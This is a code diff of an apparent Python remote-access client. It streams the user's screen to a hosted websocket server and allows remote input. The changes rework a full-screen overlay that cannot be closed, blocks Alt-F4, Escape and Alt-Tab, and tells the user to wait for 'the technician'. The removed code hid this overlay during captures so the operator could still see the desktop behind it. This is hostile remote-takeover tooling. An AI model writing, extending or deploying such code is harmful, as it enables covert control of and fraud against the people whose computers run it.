@@ -8,6 +8,7 @@ import platform
 import getpass
 import hashlib
 import ctypes
+import ctypes.wintypes as wintypes
 import ssl
 import sys
 import subprocess
@@ -19,7 +20,7 @@ import pyautogui
 import pyperclip
 
 SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
-FRAME_INTERVAL = 0.04
+FRAME_INTERVAL = 0.05
 QUALITY = 70
 SCALE = 0.75
 
@@ -35,17 +36,11 @@ panel_connected = False
 ws_app = None
 running = True
 screen_locked = False
-lock_hwnd = None
-screen_width = 1920
-screen_height = 1080
+lock_pid = None
+last_good_frame = None
 
-# Windows API
 user32 = ctypes.windll.user32
-SWP_NOSIZE = 0x0001
-SWP_NOZORDER = 0x0004
-SWP_NOACTIVATE = 0x0010
-SWP_SHOWWINDOW = 0x0040
-HWND_TOPMOST = -1
+gdi32 = ctypes.windll.gdi32
 
 
 def set_console_title(title):
@@ -138,43 +133,38 @@ def get_system_info():
 
 
 # ============================================
-# LOCK SCREEN
+# LOCK SCREEN - PROCESSO SEPARADO
 # ============================================
 
 LOCK_SCRIPT = '''
 import sys
+import os
 import ctypes
 
 user32 = ctypes.windll.user32
 sw = user32.GetSystemMetrics(0)
 sh = user32.GetSystemMetrics(1)
 
+# Salvar PID
+import tempfile
+pid_file = os.path.join(tempfile.gettempdir(), 'lock_pid.txt')
+with open(pid_file, 'w') as f:
+    f.write(str(os.getpid()))
+
 import tkinter as tk
 
 message = sys.argv[1] if len(sys.argv) > 1 else "Aguarde..."
 
 root = tk.Tk()
-root.title("")
+root.title("LOCK_SCREEN_WINDOW")
 root.geometry(f"{sw}x{sh}+0+0")
 root.configure(bg='#0a0a0a')
 root.overrideredirect(True)
 root.attributes('-topmost', True)
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-for key in ['<Alt-F4>', '<Escape>', '<Alt-Tab>', '<Alt-Escape>', '<Control-Escape>']:
+for key in ['<Alt-F4>', '<Escape>', '<Alt-Tab>']:
     root.bind(key, lambda e: 'break')
-
-root.update_idletasks()
-hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
-if hwnd == 0:
-    hwnd = root.winfo_id()
-
-# Salvar HWND em arquivo para o processo principal
-import tempfile
-import os
-hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')
-with open(hwnd_file, 'w') as f:
-    f.write(str(hwnd))
 
 frame = tk.Frame(root, bg='#0a0a0a')
 frame.place(relx=0.5, rely=0.5, anchor='center')
@@ -184,13 +174,10 @@ tk.Label(frame, text=message, font=('Segoe UI', 28, 'bold'), bg='#0a0a0a', fg='#
 tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.", font=('Segoe UI', 14), bg='#0a0a0a', fg='#666666').pack(pady=10)
 
 def stay_top():
-    try:
-        root.lift()
-        root.focus_force()
-        root.attributes('-topmost', True)
-        root.after(100, stay_top)
-    except:
-        pass
+    root.lift()
+    root.focus_force()
+    root.attributes('-topmost', True)
+    root.after(50, stay_top)
 
 stay_top()
 root.mainloop()
@@ -198,22 +185,21 @@ root.mainloop()
 
 
 def show_lock_screen(message):
-    global screen_locked, lock_hwnd
+    global screen_locked, lock_pid, last_good_frame
 
     if screen_locked:
         return
 
     screen_locked = True
-    lock_hwnd = None
+    lock_pid = None
 
     try:
         import tempfile
         script_path = os.path.join(tempfile.gettempdir(), 'lock_screen.pyw')
-        hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')
+        pid_file = os.path.join(tempfile.gettempdir(), 'lock_pid.txt')
 
-        # Remover arquivo antigo
         try:
-            os.remove(hwnd_file)
+            os.remove(pid_file)
         except:
             pass
 
@@ -229,12 +215,12 @@ def show_lock_screen(message):
             creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
         )
 
-        # Aguardar HWND ser salvo
-        for _ in range(20):
+        # Aguardar PID
+        for _ in range(30):
             time.sleep(0.1)
-            if os.path.exists(hwnd_file):
-                with open(hwnd_file, 'r') as f:
-                    lock_hwnd = int(f.read().strip())
+            if os.path.exists(pid_file):
+                with open(pid_file, 'r') as f:
+                    lock_pid = int(f.read().strip())
                 break
 
     except:
@@ -242,19 +228,19 @@ def show_lock_screen(message):
 
 
 def hide_lock_screen():
-    global screen_locked, lock_hwnd
+    global screen_locked, lock_pid
 
     screen_locked = False
 
-    if lock_hwnd:
+    if lock_pid:
         try:
-            # Fechar janela
-            user32.PostMessageW(lock_hwnd, 0x0010, 0, 0)  # WM_CLOSE
+            subprocess.run(['taskkill', '/f', '/pid', str(lock_pid)],
+                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         except:
             pass
-        lock_hwnd = None
+        lock_pid = None
 
-    # Matar processos pythonw que rodam o lock
+    # Backup: matar pythonw
     try:
         subprocess.run(['taskkill', '/f', '/im', 'pythonw.exe'],
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -266,14 +252,17 @@ def hide_lock_screen():
 # CAPTURA DE TELA
 # ============================================
 
+def capture_screen_normal(sct):
+    """Captura normal via mss"""
+    monitor = sct.monitors[1]
+    screenshot = sct.grab(monitor)
+    return Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
+
+
 def capture_screen():
-    global panel_connected, running, current_quality, current_scale, lock_hwnd, screen_width, screen_height
+    global panel_connected, running, current_quality, current_scale, last_good_frame
 
     sct = mss.mss()
-
-    # Pegar dimensoes da tela
-    screen_width = user32.GetSystemMetrics(0)
-    screen_height = user32.GetSystemMetrics(1)
 
     while running:
         if not panel_connected:
@@ -281,39 +270,35 @@ def capture_screen():
             continue
 
         try:
-            # Se lock ativo, mover janela para fora, capturar, mover de volta
-            hwnd = lock_hwnd if screen_locked else None
+            # Se tela bloqueada, usar ultimo frame bom
+            if screen_locked:
+                if last_good_frame:
+                    frame_data = last_good_frame
+                else:
+                    time.sleep(FRAME_INTERVAL)
+                    continue
+            else:
+                # Captura normal
+                img = capture_screen_normal(sct)
 
-            if hwnd:
-                # Mover para fora da tela (instantaneo)
-                user32.SetWindowPos(hwnd, 0, -9999, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)
+                new_w = int(img.width * current_scale)
+                new_h = int(img.height * current_scale)
+                img = img.resize((new_w, new_h), Image.LANCZOS)
 
-            # Capturar
-            monitor = sct.monitors[1]
-            screenshot = sct.grab(monitor)
+                buffer = BytesIO()
+                img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
+                frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
 
-            if hwnd:
-                # Mover de volta (instantaneo)
-                user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW)
-
-            # Processar imagem
-            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
-
-            new_w = int(img.width * current_scale)
-            new_h = int(img.height * current_scale)
-            img = img.resize((new_w, new_h), Image.LANCZOS)
-
-            buffer = BytesIO()
-            img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
-            frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
+                # Salvar como ultimo frame bom
+                last_good_frame = frame_data
 
             if ws_app and is_connected:
                 ws_app.send(json.dumps({
                     "type": "screen-frame",
                     "clientId": client_id,
                     "frame": frame_data,
-                    "width": new_w,
-                    "height": new_h
+                    "width": int(user32.GetSystemMetrics(0) * current_scale),
+                    "height": int(user32.GetSystemMetrics(1) * current_scale)
                 }))
 
             time.sleep(FRAME_INTERVAL)
